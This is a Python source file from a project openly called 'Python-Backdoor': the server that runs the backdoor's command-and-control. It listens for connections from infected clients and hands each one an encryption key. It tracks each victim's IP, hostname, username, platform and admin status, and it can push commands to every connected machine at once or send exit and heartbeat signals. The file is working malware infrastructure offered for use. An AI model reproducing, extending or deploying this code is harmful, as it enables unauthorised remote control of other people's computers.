"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import logging
import socket
import sys
import time
from threading import Thread

from src.encrypted_socket import EncryptedSocket
from src.encryption import Encryption
from src import helper, errors
from src.definitions.commands import *

from src.logger import LOGGER_ID


class Server:
    def __init__(self, port):
        self.logger = logging.getLogger(LOGGER_ID)

        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.encryption = Encryption()
        self.fernet = self.encryption.fernet

        self.listener = socket.socket()

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            self.logger.error(f"Error creating socket {e}")
            sys.exit(0)

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error as e:
                self.logger.warning(f"Error binding socket {e}\nRetrying...")
                time.sleep(3)
                bind()

        bind()

        self.logger.info(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    _socket, address = self.listener.accept()
                    _socket.setblocking(True)

                    es = EncryptedSocket(_socket, self.fernet)

                    # first command is always the unencrypted key (as b64)
                    # not the best solution, but sending it raw without wrapped JSON will remove emphasis
                    es.send(base64.b64encode(self.encryption.key), False)
                    self.logger.debug(f"send key: {self.encryption.key}")

                    while True:
                        # wait for handshake
                        response = es.recv_json()
                        if response["key"] == CLIENT_HANDSHAKE:
                            break

                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True}}

                    if es.socket in self.connections:
                        self.addresses[self.connections.index(es.socket)]["connected"] = True
                    else:
                        self.connections.append(es.socket)
                        self.addresses.append(address)

                    self.logger.info(
                        f"Connection {len(self.connections)} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                except socket.error as err:
                    self.logger.error(f"Error accepting connection {err}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _, _socket in enumerate(self.active_connections()):
                es = EncryptedSocket(_socket, self.fernet)

                try:
                    es.send_json(CLIENT_EXIT)
                    es.socket.close()
                except socket.error:
                    pass
        else:
            self.logger.warning("No connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []

    # either close with by index or a socket
    def close_one(self, index=-1, sck=None):
        if index == -1:
            if sck is None:
                self.logger.error("Invalid use of function")
                return

            index = self.connections.index(sck) + 1

        try:
            es = self.select(index)
        except errors.ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return

        try:
            es.send_json(CLIENT_EXIT)
            es.socket.close()
        except socket.error:
            pass

        self.addresses[self.connections.index(es.socket)]["connected"] = False

    def refresh(self):
        for _, _socket in enumerate(self.active_connections()):
            close_conn = False

            es = EncryptedSocket(_socket, self.fernet)

            try:
                es.send_json(CLIENT_HEARTBEAT)
            except socket.error:
                close_conn = True
            else:
                if es.recv_json()["key"] != SUCCESS:
                    close_conn = True

            if close_conn:
                # close conn, but don't send the close signal, so it can restart
                es.socket.close()
                self.addresses[self.connections.index(es.socket)]["connected"] = False

    def get_address(self, _socket):
        return self.addresses[self.connections.index(_socket)]

    def list(self, inactive=False):
        addresses = []
        # add ID
        for i, address in enumerate(self.addresses):
            if (inactive and not address["connected"]) or (not inactive and address["connected"]):
                address = {**{"index": str(i + 1)}, **address}
                addresses.append(address)

        if len(addresses) > 0:
            info = "\n"
            for key in addresses[0]:
                if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                    info += f"{helper.center(str(addresses[0][key]), str(key))}{4 * ' '}"

            info += "\n"

            for i, address in enumerate(addresses):
                for key in address:
                    if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                        info += f"{helper.center(key, address[key])}{4 * ' '}"

                if i < len(addresses) - 1:
                    info += "\n"

            return info
        else:
            _str = "inactive" if inactive else "active"

            self.logger.warning(f"No {_str} connections")
            return ""

    # connection id should be actual index + 1
    def select(self, connection_id):
        try:
            connection_id = int(connection_id)

            if connection_id < 1:
                raise Exception

            _socket = self.connections[connection_id - 1]

            if not self.addresses[connection_id - 1]["connected"]:
                raise Exception

        except Exception:
            raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")

        return EncryptedSocket(_socket, self.fernet)

    def send_all_connections(self, key, value, recv=False, recvall=False):
        if self.num_active_connections() > 0:
            for i, _socket in enumerate(self.active_connections()):

                es = EncryptedSocket(_socket, self.fernet)

                try:
                    es.send_json(key, value)
                except socket.error:
                    continue

                output = ""

                if recvall:
                    buffer = es.recv_json()["value"]["buffer"]
                    output = es.recvall(buffer).decode()
                elif recv:
                    output = es.recv_json()["value"]

                if output:
                    _info = self.addresses[self.connections.index(es.socket)]
                    print(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
        else:
            self.logger.warning("No active connections")

    def active_connections(self):
        conns = []

        for i, address in enumerate(self.addresses):
            if address["connected"]:
                conns.append(self.connections[i])

        return conns

    def num_active_connections(self):
        count = 0

        for address in self.addresses:
            if address["connected"]:
                count += 1

        return count
